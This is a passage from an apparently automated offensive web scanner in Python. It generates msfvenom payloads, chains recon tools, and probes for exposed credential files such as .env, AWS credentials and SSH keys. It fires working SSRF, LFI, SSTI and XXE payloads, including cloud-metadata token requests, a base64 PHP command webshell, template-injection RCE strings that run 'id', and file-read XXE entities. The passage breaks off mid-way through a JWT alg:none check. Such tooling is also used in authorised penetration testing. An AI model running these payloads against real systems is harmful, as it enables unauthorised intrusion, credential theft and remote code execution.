                add_finding('high', f'MSFVENOM: Successfully generated {selected_payload} ({payload_size} bytes)', asset=f"PAYLOAD_GEN: {selected_payload}", tool='msfvenom')
                log('green', f'[MSFVENOM] SUCCESS: Generated {selected_payload} ({payload_size} bytes)')
                return 1
            else:
                error_msg = process.stderr.decode().strip().split('\n')[-1]
                log('yellow', f'[MSFVENOM] FAILED: Could not build payload {selected_payload}. Error: {error_msg}')
        except Exception as e:
            log('yellow', f'[MSFVENOM] Error executing msfvenom: {e}')
        return 0

    with ThreadPoolExecutor(max_workers=2) as executor:
        futures = {executor.submit(generate_payload, exp, i): exp for i, exp in enumerate(active_exploits)}
        for i, future in enumerate(as_completed(futures)):
            if check_stop(): break
            generated_count += future.result()
            progress = int(((i + 1) / len(active_exploits)) * 100)
            log('red', f'[MSFVENOM] Payload generation progress: {progress}%', tool='msfvenom', progress=progress)

    log('green', f'[MSFVENOM] Payload generation phase complete. {generated_count} payloads validated.', tool='msfvenom', progress=100)

def run_adaptive_method_scan(target):
    """ADAPTIVE: Try multiple HTTP methods on all discovered endpoints!"""
    log('cyan', f'[ADAPTIVE-METHOD] Testing multiple HTTP methods...', tool='deep_dive', progress=0)
    
    try:
        _, base_url = request_with_fallback(target, '/')
    except:
        return

    test_methods = ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH', 'HEAD', 'TRACE']
    test_paths = ['/', '/admin', '/api', '/api/v1', '/login', '/register', '/test', '/debug']
    
    issues_found = 0
    
    def test_method_on_path(method, path):
        if check_stop(): return None
        try:
            url = urljoin(f'{base_url}/', path.lstrip('/'))
            res = requests.request(method, url, timeout=3, headers=HTTP_HEADERS, allow_redirects=False)
            if res.status_code not in [404, 405]:
                return (method, path, res.status_code)
        except:
            pass
        return None

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(test_method_on_path, m, p) for m in test_methods for p in test_paths]
        for i, future in enumerate(as_completed(futures)):
            if check_stop(): break
            result = future.result()
            if result:
                method, path, status = result
                severity = 'med' if method in ['PUT', 'DELETE', 'TRACE'] else 'low'
                add_finding(severity, f'ADAPTIVE-METHOD: {method} allowed on {path} (HTTP {status})', asset=f"HTTP_METHOD: {method} @ {path}", tool='deep_dive')
                log('yellow' if severity == 'med' else 'cyan', f'[ADAPTIVE-METHOD] {method} {path} → {status}')
                issues_found += 1
    
    log('green', f'[ADAPTIVE-METHOD] Tested {len(test_methods)} methods on {len(test_paths)} paths. Found {issues_found} interesting responses.', tool='deep_dive', progress=100)

def run_data_leakage_scan(target):
    """GOD-LEVEL: High-speed multi-threaded sensitive data leakage audit"""
    if check_stop(): return 0
    log('yellow', f'[LEAK-SCAN] Starting high-speed multi-threaded data leakage audit on {target}...', tool='ctf', progress=0)
    
    sensitive_paths = [
        ('/.env', 'crit'), ('/.git/config', 'high'), ('/.aws/credentials', 'crit'),
        ('/.ssh/id_rsa', 'crit'), ('/config/database.yml', 'high'), ('/etc/passwd', 'crit'),
        ('/wp-config.php.bak', 'high'), ('/backup.sql', 'high'), ('/docker-compose.yml', 'high'),
        ('/.npmrc', 'med'), ('/package-lock.json', 'low'), ('/composer.json', 'low')
    ]
    
    try:
        _, base_url = request_with_fallback(target, '/')
    except Exception as e:
        log('red', f'[LEAK-SCAN] Target unreachable: {e}', tool='ctf', progress=100)
        return 0
    
    leaks = []
    def check_leak(path, severity):
        if check_stop(): return None
        url = urljoin(f'{base_url}/', path.lstrip('/'))
        try:
            response = requests.get(url, timeout=3, headers=HTTP_HEADERS, allow_redirects=False)
            if response.status_code == 200:
                content = response.text or ''
                found_secrets = extract_secret_leaks(content[:50000])
                return (path, severity, found_secrets)
        except:
            pass
        return None

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(check_leak, path, sev): path for path, sev in sensitive_paths}
        for i, future in enumerate(as_completed(futures)):
            if check_stop(): break
            result = future.result()
            if result:
                path, severity, secrets = result
                if secrets:
                    for secret in secrets:
                        add_finding('crit', f'DATA-LEAK: {secret} found in {path}', asset=f"LEAKED_{secret}: {path}", tool='ctf')
                        log('red', f'[!] CRITICAL: {secret} EXPOSED IN {path}')
                        leaks.append(path)
                else:
                    add_finding(severity, f'EXPOSED-FILE: Sensitive file {path} accessible', asset=f"EXPOSED_FILE: {path}", tool='ctf')
                    log('red' if severity in ['crit', 'high'] else 'yellow', f'[!] Found: {path}')
                    leaks.append(path)
            
            progress = int(((i + 1) / len(sensitive_paths)) * 100)
            if i % 3 == 0:
                log('cyan', f'[LEAK-SCAN] Audit progress: {progress}%', tool='ctf', progress=progress)

    log('green', f'[LEAK-SCAN] Data leakage audit complete. Found {len(leaks)} exposures.', tool='ctf', progress=100)
    return len(leaks)

def run_subfinder(target):
    """Subdomain enumeration using subfinder (or fallback to our existing Python function)"""
    if check_stop(): return
    log('cyan', f'[SUBFINDER] Starting subdomain enumeration...', tool='subfinder', progress=0)
    try:
        # Try subfinder binary
        result = subprocess.run(['subfinder', '-d', target, '-silent'], capture_output=True, text=True, timeout=300)
        subdomains = result.stdout.strip().split('\n') if result.stdout else []
        for sub in subdomains:
            if sub and sub.strip():
                scan_state['discovered_assets'].add(f"SUBDOMAIN: {sub.strip()}")
        log('green', f'[SUBFINDER] Found {len([s for s in subdomains if s.strip()])} subdomains', tool='subfinder', progress=100)
    except (FileNotFoundError, Exception) as e:
        log('yellow', f'[SUBFINDER] Binary not found/error, using Python fallback...', tool='subfinder', progress=50)
        run_subdomain_enum_original(target)

def run_amass(target):
    """Passive subdomain enumeration using amass"""
    if check_stop(): return
    log('cyan', f'[AMASS] Starting passive subdomain enumeration...', tool='amass', progress=0)
    try:
        result = subprocess.run(['amass', 'enum', '-d', target, '-passive', '-silent'], capture_output=True, text=True, timeout=300)
        subdomains = result.stdout.strip().split('\n') if result.stdout else []
        for sub in subdomains:
            if sub and sub.strip():
                scan_state['discovered_assets'].add(f"SUBDOMAIN (AMASS): {sub.strip()}")
        log('green', f'[AMASS] Found {len([s for s in subdomains if s.strip()])} subdomains', tool='amass', progress=100)
    except Exception as e:
        log('yellow', f'[AMASS] Error: {e}, skipping...', tool='amass', progress=100)

def run_httpx(target, subs_file=None):
    """Live host detection using httpx (or simple fallback)"""
    if check_stop(): return
    log('cyan', f'[HTTPX] Starting live host detection...', tool='httpx', progress=0)
    try:
        if subs_file and os.path.exists(subs_file):
            result = subprocess.run(['httpx', '-l', subs_file, '-title', '-tech-detect', '-status-code', '-silent'], capture_output=True, text=True, timeout=300)
        else:
            result = subprocess.run(['httpx', '-u', target, '-title', '-tech-detect', '-status-code', '-silent'], capture_output=True, text=True, timeout=300)
        lines = result.stdout.strip().split('\n') if result.stdout else []
        for line in lines:
            if line and line.strip():
                scan_state['discovered_assets'].add(f"LIVE_HOST: {line.strip()}")
        log('green', f'[HTTPX] Found {len([l for l in lines if l.strip()])} live hosts', tool='httpx', progress=100)
    except Exception as e:
        log('yellow', f'[HTTPX] Error: {e}, using simple check...', tool='httpx', progress=50)
        # Simple fallback: just check if target responds
        try:
            _, base_url = request_with_fallback(target, '/')
            scan_state['discovered_assets'].add(f"LIVE_HOST: {base_url}")
            log('green', f'[HTTPX-FALLBACK] Target is live at {base_url}', tool='httpx', progress=100)
        except:
            pass

def run_naabu(target):
    """Port scanning using naabu (or fallback to Python scanner)"""
    if check_stop(): return []
    log('cyan', f'[NAABU] Starting port scan...', tool='naabu', progress=0)
    try:
        result = subprocess.run(['naabu', '-host', target, '-silent'], capture_output=True, text=True, timeout=300)
        ports = result.stdout.strip().split('\n') if result.stdout else []
        open_ports = []
        for p in ports:
            if p and p.strip() and p.strip().isdigit():
                open_ports.append(int(p.strip()))
                scan_state['discovered_assets'].add(f"OPEN_PORT: {p.strip()}")
        log('green', f'[NAABU] Found {len(open_ports)} open ports', tool='naabu', progress=100)
        return open_ports
    except Exception as e:
        log('yellow', f'[NAABU] Error: {e}, using Python fallback...', tool='naabu', progress=50)
        return run_nmap_python_fallback(target)

def run_gobuster(target):
    """Directory fuzzing using gobuster (or fallback to Python fuzzer)"""
    if check_stop(): return
    log('cyan', f'[GOBUSTER] Starting directory fuzzing...', tool='gobuster', progress=0)
    try:
        _, base_url = request_with_fallback(target, '/')
        result = subprocess.run(['gobuster', 'dir', '-u', base_url, '-w', '/usr/share/wordlists/common.txt', '-q', '-z'], capture_output=True, text=True, timeout=600)
        paths = result.stdout.strip().split('\n') if result.stdout else []
        for path in paths:
            if path and path.strip() and not path.startswith('[ERROR]'):
                scan_state['discovered_assets'].add(f"DISCOVERED_PATH: {path.strip()}")
        log('green', f'[GOBUSTER] Found {len([p for p in paths if p.strip() and not p.startswith("[ERROR]")])} directories', tool='gobuster', progress=100)
    except Exception as e:
        log('yellow', f'[GOBUSTER] Error: {e}, using Python fallback...', tool='gobuster', progress=50)
        run_fuzzing_engine(target)

def run_ffuf(target):
    """Directory fuzzing using ffuf"""
    if check_stop(): return
    log('cyan', f'[FFUF] Starting directory fuzzing...', tool='ffuf', progress=0)
    try:
        _, base_url = request_with_fallback(target, '/')
        result = subprocess.run(['ffuf', '-u', f"{base_url}/FUZZ", '-w', '/usr/share/wordlists/common.txt', '-s'], capture_output=True, text=True, timeout=600)
        paths = result.stdout.strip().split('\n') if result.stdout else []
        for path in paths:
            if path and path.strip():
                scan_state['discovered_assets'].add(f"DISCOVERED_PATH (FFUF): {path.strip()}")
        log('green', f'[FFUF] Found {len([p for p in paths if p.strip()])} directories', tool='ffuf', progress=100)
    except Exception as e:
        log('yellow', f'[FFUF] Error: {e}, skipping...', tool='ffuf', progress=100)

def run_katana(target):
    """Web crawling using katana (or fallback to our crawler)"""
    if check_stop(): return
    log('cyan', f'[KATANA] Starting web crawling...', tool='katana', progress=0)
    try:
        _, base_url = request_with_fallback(target, '/')
        result = subprocess.run(['katana', '-u', base_url, '-d', '5', '-jc', '-kf', '-silent'], capture_output=True, text=True, timeout=600)
        urls = result.stdout.strip().split('\n') if result.stdout else []
        for url in urls:
            if url and url.strip():
                scan_state['discovered_assets'].add(f"CRAWLED_URL (KATANA): {url.strip()}")
        log('green', f'[KATANA] Found {len([u for u in urls if u.strip()])} URLs', tool='katana', progress=100)
    except Exception as e:
        log('yellow', f'[KATANA] Error: {e}, using Python fallback...', tool='katana', progress=50)
        run_crawling(target)

def run_gau(target):
    """URL discovery using gau (or fallback to wayback_lookup)"""
    if check_stop(): return
    log('cyan', f'[GAU] Starting URL discovery...', tool='gau', progress=0)
    try:
        result = subprocess.run(['gau', '--subs', target], capture_output=True, text=True, timeout=300)
        urls = result.stdout.strip().split('\n') if result.stdout else []
        for url in urls:
            if url and url.strip():
                scan_state['discovered_assets'].add(f"DISCOVERED_URL (GAU): {url.strip()}")
        log('green', f'[GAU] Found {len([u for u in urls if u.strip()])} historical URLs', tool='gau', progress=100)
    except Exception as e:
        log('yellow', f'[GAU] Error: {e}, using Wayback Machine fallback...', tool='gau', progress=50)
        run_wayback_lookup(target)

def run_waybackurls(target):
    """URL discovery using waybackurls (or fallback to wayback_lookup)"""
    if check_stop(): return
    log('cyan', f'[WAYBACKURLS] Starting URL discovery...', tool='waybackurls', progress=0)
    try:
        result = subprocess.run(['waybackurls', target], capture_output=True, text=True, timeout=300)
        urls = result.stdout.strip().split('\n') if result.stdout else []
        for url in urls:
            if url and url.strip():
                scan_state['discovered_assets'].add(f"DISCOVERED_URL (Wayback): {url.strip()}")
        log('green', f'[WAYBACKURLS] Found {len([u for u in urls if u.strip()])} historical URLs', tool='waybackurls', progress=100)
    except Exception as e:
        log('yellow', f'[WAYBACKURLS] Error: {e}, using Wayback Machine fallback...', tool='waybackurls', progress=50)
        run_wayback_lookup(target)

def run_arjun(target):
    """Parameter discovery using arjun"""
    if check_stop(): return
    log('cyan', f'[ARJUN] Starting parameter discovery...', tool='arjun', progress=0)
    try:
        _, base_url = request_with_fallback(target, '/')
        result = subprocess.run(['arjun', '-u', base_url, '-oT', '/dev/stdout'], capture_output=True, text=True, timeout=600)
        lines = result.stdout.strip().split('\n') if result.stdout else []
        for line in lines:
            if line and line.strip() and 'parameter' in line.lower():
                scan_state['discovered_assets'].add(f"DISCOVERED_PARAM: {line.strip()}")
        log('green', '[ARJUN] Parameter discovery complete', tool='arjun', progress=100)
    except Exception as e:
        log('yellow', f'[ARJUN] Error: {e}, skipping...', tool='arjun', progress=100)

def run_dalfox(target):
    """XSS scanning using dalfox (or fallback to our XSS scanner)"""
    if check_stop(): return
    log('cyan', f'[DALFOX] Starting XSS scan...', tool='dalfox', progress=0)
    try:
        _, base_url = request_with_fallback(target, '/')
        result = subprocess.run(['dalfox', 'url', base_url, '--silence'], capture_output=True, text=True, timeout=600)
        if result.stdout and 'XSS' in result.stdout:
            add_finding('high', 'XSS vulnerability detected', asset=f"XSS: {target}", tool='dalfox')
            log('red', '[DALFOX] XSS vulnerability detected', tool='dalfox')
        log('green', '[DALFOX] XSS scan complete', tool='dalfox', progress=100)
    except Exception as e:
        log('yellow', f'[DALFOX] Error: {e}, using Python fallback...', tool='dalfox', progress=50)
        run_xss_scan(target)

def run_wpscan(target):
    """WordPress scanning using wpscan"""
    if check_stop(): return
    log('cyan', f'[WPSCAN] Starting WordPress scan...', tool='wpscan', progress=0)
    try:
        _, base_url = request_with_fallback(target, '/')
        result = subprocess.run(['wpscan', '--url', base_url, '--no-update', '--no-banner'], capture_output=True, text=True, timeout=600)
        lines = result.stdout.strip().split('\n') if result.stdout else []
        for line in lines:
            if line and line.strip() and any(kw in line.lower() for kw in ['vulnerability', 'outdated', 'weak']):
                add_finding('med', f'WordPress issue: {line.strip()}', asset=f"WP: {target}", tool='wpscan')
        log('green', '[WPSCAN] WordPress scan complete', tool='wpscan', progress=100)
    except Exception as e:
        log('yellow', f'[WPSCAN] Error: {e}, skipping...', tool='wpscan', progress=100)

def run_jsubfinder(target):
    """JS file analysis using jsubfinder (or use our crawler + JS analysis)"""
    if check_stop(): return
    log('cyan', f'[JSUBFINDER] Starting JS file analysis...', tool='jsubfinder', progress=0)
    try:
        _, base_url = request_with_fallback(target, '/')
        result = subprocess.run(['jsubfinder', '-u', base_url, '-silent'], capture_output=True, text=True, timeout=600)
        lines = result.stdout.strip().split('\n') if result.stdout else []
        for line in lines:
            if line and line.strip():
                scan_state['discovered_assets'].add(f"JS_ENDPOINT: {line.strip()}")
        log('green', '[JSUBFINDER] JS file analysis complete', tool='jsubfinder', progress=100)
    except Exception as e:
        log('yellow', f'[JSUBFINDER] Error: {e}, skipping...', tool='jsubfinder', progress=100)

def run_ssrf_testing(target):
    """Comprehensive SSRF testing (protocols, cloud metadata, DNS rebinding)"""
    if check_stop(): return
    log('cyan', f'[SSRF] Starting comprehensive SSRF testing...', tool='ssrf', progress=0)
    issues_found =0
    try:
        response, base_url = request_with_fallback(target, '/')
        session = requests.Session()
        session.headers.update(HTTP_HEADERS)
        
        params = crawl_for_parameters(target)
        if not params:
            params = ['url', 'uri', 'redirect', 'next', 'target', 'dest', 'source', 'file', 'path', 'u', 'r', 'src', 'href']
        
        log('cyan', f'[SSRF] Testing {len(params)} params...', tool='ssrf', progress=20)
        
        ssrf_tests = [
            # Localhost/loopback
            ('http://127.0.0.1', 'Loopback IPv4'),
            ('http://localhost', 'localhost'),
            ('http://0.0.0.0', '0.0.0.0'),
            ('http://[::1]', 'IPv6 Loopback'),
            ('http://0177.0.0.1', 'Octal Loopback'),
            
            # Internal IP ranges
            ('http://10.0.0.1', 'Private 10.x'),
            ('http://172.16.0.1', 'Private 172.16.x'),
            ('http://192.168.1.1', 'Private 192.168.x'),
            
            # File protocol
            ('file:///etc/passwd', 'File protocol Linux passwd'),
            ('file:///c:/windows/win.ini', 'File protocol Windows win.ini'),
            
            # Other protocols
            ('ftp://127.0.0.1:21', 'FTP'),
            ('gopher://127.0.0.1:6379/_info', 'Gopher (Redis)'),
            ('dict://127.0.0.1:6379/info', 'Dict protocol'),
            
            # Cloud metadata
            ('http://169.254.169.254/latest/meta-data/', 'AWS IMDSv1'),
            ('http://169.254.169.254/latest/user-data/', 'AWS user-data'),
            ('http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token', 'GCP metadata'),
            ('http://169.254.169.254/metadata/instance?api-version=2021-02-01', 'Azure metadata'),
            ('http://169.254.169.254/metadata/v1.json', 'DigitalOcean metadata'),
            
            # DNS rebinding concept
            ('http://1e100.net', 'DNS Rebind concept')
        ]
        
        for param in params:
            if check_stop(): break
            log('cyan', f'[SSRF] Testing param: {param}', tool='ssrf')
            for payload, desc in ssrf_tests:
                try:
                    # Add appropriate headers for cloud metadata
                    headers = HTTP_HEADERS.copy()
                    if 'google' in payload.lower():
                        headers['Metadata-Flavor'] = 'Google'
                    elif 'azure' in desc.lower():
                        headers['Metadata'] = 'true'
                    
                    res = session.get(base_url, params={param: payload}, headers=headers, timeout=10)
                    vuln = False
                    if 'root:x:' in res.text:
                        add_finding('crit', f'SSRF confirmed: ?{param}={payload} ({desc} - Linux passwd)', asset=f'SSRF_{param}_passwd', tool='ssrf')
                        log('red', f'[SSRF] CRITICAL SSRF found (Linux passwd)!', tool='ssrf')
                        vuln = True
                    if '[extensions]' in res.text:
                        add_finding('crit', f'SSRF confirmed: ?{param}={payload} ({desc} - Windows win.ini)', asset=f'SSRF_{param}_winini', tool='ssrf')
                        log('red', f'[SSRF] CRITICAL SSRF found (Windows win.ini)!', tool='ssrf')
                        vuln = True
                    if any(x in res.text for x in ['ami-id', 'instance-id', 'access-token', 'serviceAccounts']):
                        add_finding('crit', f'SSRF confirmed (Cloud metadata): ?{param}={payload} ({desc})', asset=f'SSRF_{param}_cloud', tool='ssrf')
                        log('red', f'[SSRF] CRITICAL SSRF found (Cloud metadata)!', tool='ssrf')
                        vuln = True
                    if vuln:
                        issues_found +=1
                        break
                    random_delay(0.15,0.35)
                except Exception as e:
                    pass
        
        log('green', f'[SSRF] SSRF testing complete! Found {issues_found} issues!', tool='ssrf', progress=100)
    except Exception as e:
        log('red', f'[SSRF] Error: {str(e)}', tool='ssrf', progress=100)
        
def run_lfi_testing(target):
    """Comprehensive LFI/RFI testing (all payload types, PHP wrappers, log poisoning)"""
    if check_stop(): return
    log('cyan', f'[LFI] Starting comprehensive LFI/RFI testing...', tool='lfi', progress=0)
    issues_found =0
    try:
        response, base_url = request_with_fallback(target, '/')
        session = requests.Session()
        session.headers.update(HTTP_HEADERS)
        
        # Crawl for parameters
        params = crawl_for_parameters(target)
        if not params:
            params = ['file', 'path', 'page', 'url', 'include', 'require', 'view', 'content', 'doc', 'f', 'src', 'inc']
        
        log('cyan', f'[LFI] Testing {len(params)} params...', tool='lfi', progress=20)
        
        lfi_payloads = [
            # Path traversal
            '../../../../etc/passwd',
            '../../../../etc/hosts',
            '../../../../windows/win.ini',
            '../../../../windows/system32/drivers/etc/hosts',
            '.././.././.././../etc/passwd',
            '....//....//....//etc/passwd',
            
            # URL encoding
            '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            
            # Double encoding
            '%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd',
            
            # PHP wrappers
            'php://filter/convert.base64-encode/resource=index.php',
            'php://filter/convert.base64-encode/resource=config.php',
            'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXTs/Pg==',
            'php://input',
            
            # Null byte
            '../../../../etc/passwd%00',
            
            # Log poisoning prep
            '../../../../var/log/apache2/access.log',
            '../../../../var/log/nginx/access.log'
        ]
        
        for param in params:
            if check_stop(): break
            log('cyan', f'[LFI] Testing param: {param}', tool='lfi')
            for payload in lfi_payloads:
                try:
                    res = session.get(base_url, params={param: payload}, timeout=8)
                    vuln = False
                    if 'root:x:' in res.text:
                        add_finding('crit', f'LFI confirmed: ?{param}={payload} (Linux passwd)', asset=f'LFI_{param}_passwd', tool='lfi')
                        log('red', f'[LFI] CRITICAL LFI found: ?{param}={payload} - Linux passwd!', tool='lfi')
                        vuln = True
                    if '[extensions]' in res.text:
                        add_finding('crit', f'LFI confirmed: ?{param}={payload} (Windows win.ini)', asset=f'LFI_{param}_winini', tool='lfi')
                        log('red', f'[LFI] CRITICAL LFI found: ?{param}={payload} - Windows win.ini!', tool='lfi')
                        vuln = True
                    # Check if base64 payload returns base64 (try decode)
                    if 'php://filter/convert.base64' in payload and len(res.text) > 100:
                        try:
                            base64.b64decode(res.text, validate=True)
                            add_finding('high', f'PHP filter wrapper confirmed: ?{param}={payload}', asset=f'LFI_{param}_phpfilter', tool='lfi')
                            log('red', f'[LFI] PHP filter wrapper confirmed!', tool='lfi')
                            vuln = True
                        except:
                            pass
                    if vuln:
                        issues_found +=1
                        break
                    random_delay(0.15, 0.3)
                except Exception as e:
                    pass
        
        log('green', f'[LFI] LFI/RFI testing complete! Found {issues_found} issues!', tool='lfi', progress=100)
    except Exception as e:
        log('red', f'[LFI] Error: {str(e)}', tool='lfi', progress=100)
        
def run_ssti_testing(target):
    """Comprehensive SSTI testing (multiple template engines, RCE payloads)"""
    if check_stop(): return
    log('cyan', f'[SSTI] Starting comprehensive SSTI testing...', tool='ssti', progress=0)
    issues_found =0
    try:
        response, base_url = request_with_fallback(target, '/')
        session = requests.Session()
        session.headers.update(HTTP_HEADERS)
        
        # Crawl for params
        params = crawl_for_parameters(target)
        if not params:
            params = ['name', 'id', 'search', 'query', 'lang', 'page', 'view', 'template', 'user', 'title', 'msg']
        
        log('cyan', f'[SSTI] Testing {len(params)} params...', tool='ssti', progress=20)
        
        # Engine-specific payloads
        ssti_tests = [
            ('{{7*7}}', 'Jinja2/Nunjucks', '{{config.__class__.__init__.__globals__[\"os\"].popen(\"id\").read()}}'),
            ('${7*7}', 'FreeMarker/Mako', '${\"freemarker.template.utility.Execute\"?new()(\"id\")}'),
            ('<%=7*7%>', 'ERB/JSP', '<%= system(\"id\") %>'),
            ('{7*7}', 'Smarty', '{system(\"id\")}'),
            ('#{7*7}', 'Pug/Jade', None),
            ('#set($x=7*7)$x', 'Velocity', None)
        ]
        
        for param in params:
            if check_stop(): break
            log('cyan', f'[SSTI] Testing param: {param}', tool='ssti')
            for payload, engine, rce_payload in ssti_tests:
                try:
                    res = session.get(base_url, params={param: payload}, timeout=6)
                    if '49' in res.text:
                        # SSTI confirmed!
                        add_finding('crit', f'SSTI confirmed: ?{param}={payload} (engine: {engine})', asset=f'SSTI_{param}_{engine}', tool='ssti')
                        log('red', f'[SSTI] CRITICAL: SSTI found ({engine}) at ?{param}={payload}!', tool='ssti')
                        issues_found +=1
                        # Try RCE payload if we have one
                        if rce_payload:
                            try:
                                rce_res = session.get(base_url, params={param: rce_payload}, timeout=6)
                                if 'uid=' in rce_res.text or 'gid=' in rce_res.text:
                                    add_finding('crit', f'RCE via SSTI: ?{param}={rce_payload}', asset=f'SSTI_RCE_{param}', tool='ssti')
                                    log('red', f'[SSTI] CRITICAL: RCE via SSTI confirmed!', tool='ssti')
                                    issues_found +=1
                            except Exception as rce_e:
                                pass
                        break
                    random_delay(0.15, 0.35)
                except Exception as e:
                    pass
        
        log('green', f'[SSTI] SSTI testing complete! Found {issues_found} issues!', tool='ssti', progress=100)
    except Exception as e:
        log('red', f'[SSTI] Error: {str(e)}', tool='ssti', progress=100)
        
def run_xxe_testing(target):
    """Comprehensive XXE testing (crawl for XML endpoints, CDATA, all payloads)"""
    if check_stop(): return
    log('cyan', f'[XXE] Starting comprehensive XXE testing...', tool='xxe', progress=0)
    issues_found =0
    try:
        response, base_url = request_with_fallback(target, '/')
        session = requests.Session()
        session.headers.update(HTTP_HEADERS)
        
        # First, crawl to find potential XML endpoints
        log('cyan', f'[XXE] Crawling for XML endpoints...', tool='xxe', progress=10)
        test_endpoints = [
            base_url,
            f'{base_url}/',
            f'{base_url}/api',
            f'{base_url}/api/v1',
            f'{base_url}/api/v2',
            f'{base_url}/soap',
            f'{base_url}/ws',
            f'{base_url}/xml',
            f'{base_url}/submit',
            f'{base_url}/upload'
        ]
        
        # XXE payload suite
        xxe_tests = [
            # Basic echo test
            ('Basic Echo', """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY test "XXE_TEST_SUCCESS">]>
<foo>&test;</foo>"""),
            # Basic Linux file read
            ('Linux passwd', """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>"""),
            # Windows win.ini
            ('Windows win.ini', """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" >]>
<foo>&xxe;</foo>"""),
            # CDATA-wrapped PHP filter
            ('CDATA PHP filter', """<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php" >]>
<foo><![CDATA[&xxe;]]></foo>"""),
            # Parameter entity
            ('Parameter Entity', """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
<!ENTITY % wrapper "<!ENTITY show '%xxe;'>">
%wrapper;]>
<foo>&show;</foo>"""),
            # Cloud metadata (AWS)
            ('AWS IMDS', """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/" >]>
<foo>&xxe;</foo>"""),
            # Cloud metadata (GCP)
            ('GCP Metadata', """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/" >]>
<foo>&xxe;</foo>"""),
            # Cloud metadata (Azure)
            ('Azure Metadata', """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/instance?api-version=2021-02-01" >]>
<foo>&xxe;</foo>"""),
            # PHP filter wrapper
            ('PHP Filter', """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=config.php" >]>
<foo>&xxe;</foo>""")
        ]
        
        content_types = ['application/xml', 'text/xml', 'application/soap+xml', 'application/xhtml+xml']
        
        log('cyan', f'[XXE] Testing {len(test_endpoints)} endpoints with {len(xxe_tests)} payloads...', tool='xxe', progress=30)
        
        for endpoint in test_endpoints:
            if check_stop(): break
            log('cyan', f'[XXE] Testing endpoint: {endpoint}', tool='xxe')
            for desc, payload in xxe_tests:
                if check_stop(): break
                for ct in content_types:
                    if check_stop(): break
                    try:
                        headers = HTTP_HEADERS.copy()
                        headers['Content-Type'] = ct
                        if 'google' in desc.lower():
                            headers['Metadata-Flavor'] = 'Google'
                        elif 'azure' in desc.lower():
                            headers['Metadata'] = 'true'
                        
                        res = session.post(endpoint, data=payload, headers=headers, timeout=12)
                        vuln = False
                        if 'XXE_TEST_SUCCESS' in res.text:
                            add_finding('high', f'XXE confirmed (echo): {desc} at {endpoint}', asset=f'XXE_echo', tool='xxe')
                            log('red', f'[XXE] XXE echo confirmed!', tool='xxe')
                            vuln = True
                        if 'root:x:' in res.text:
                            add_finding('crit', f'XXE confirmed (Linux passwd): {desc} at {endpoint}', asset=f'XXE_passwd', tool='xxe')
                            log('red', f'[XXE] CRITICAL: XXE (Linux passwd) found!', tool='xxe')
                            vuln = True
                        if '[extensions]' in res.text:
                            add_finding('crit', f'XXE confirmed (Windows win.ini): {desc} at {endpoint}', asset=f'XXE_winini', tool='xxe')
                            log('red', f'[XXE] CRITICAL: XXE (Windows win.ini) found!', tool='xxe')
                            vuln = True
                        if any(x in res.text for x in ['ami-id', 'instance-id', 'access-token', 'serviceAccounts']):
                            add_finding('crit', f'XXE confirmed (Cloud metadata): {desc} at {endpoint}', asset=f'XXE_cloud', tool='xxe')
                            log('red', f'[XXE] CRITICAL: XXE (Cloud metadata) found!', tool='xxe')
                            vuln = True
                        if vuln:
                            issues_found +=1
                            break
                        random_delay(0.2,0.4)
                    except Exception as e:
                        pass
        
        log('green', f'[XXE] XXE testing complete! Found {issues_found} issues!', tool='xxe', progress=100)
    except Exception as e:
        log('red', f'[XXE] Error: {str(e)}', tool='xxe', progress=100)
    
def run_auth_testing(target):
    """Comprehensive authentication & access control testing (JWT, IDOR, CSRF, rate limiting, session, password policy)"""
    if check_stop(): return
    log('cyan', f'[AUTH] Starting comprehensive authentication testing...', tool='auth', progress=0)
    issues_found = 0
    try:
        response, base_url = request_with_fallback(target, '/')
        session = requests.Session()
        session.headers.update(HTTP_HEADERS)
        soup = BeautifulSoup(response.text, 'html.parser')
        issues_found = 0
        
        # --- 1. JWT Testing ---
        log('cyan', '[AUTH] Checking for JWT tokens...', tool='auth', progress=10)
        jwt_cookies = []
        if 'Set-Cookie' in response.headers:
            for cookie in session.cookies:
                cookie_val = cookie.value
                if len(cookie_val.split('.')) == 3:  # JWT has 3 parts separated by .
                    jwt_cookies.append(cookie)
        
        for jwt_cookie in jwt_cookies:
            log('yellow', f'[AUTH] Found JWT in cookie: {jwt_cookie.name}', tool='auth')
            try:
                header_b64, payload_b64, _ = jwt_cookie.value.split('.')
                # Decode base64 (add padding if needed)
                header = json.loads(base64.b64decode(header_b64 + '='*((4 - len(header_b64) %4 )%4 )).decode('utf-8', errors='replace'))
                payload = json.loads(base64.b64decode(payload_b64 + '='*((4 - len(payload_b64) %4 )%4 )).decode('utf-8', errors='replace'))
                log('cyan', f'  JWT Header: {header}', tool='auth')
                log('cyan', f'  JWT Payload: {payload}', tool='auth')
                
                # Test alg:none attack
                if header.get('alg') != 'none':
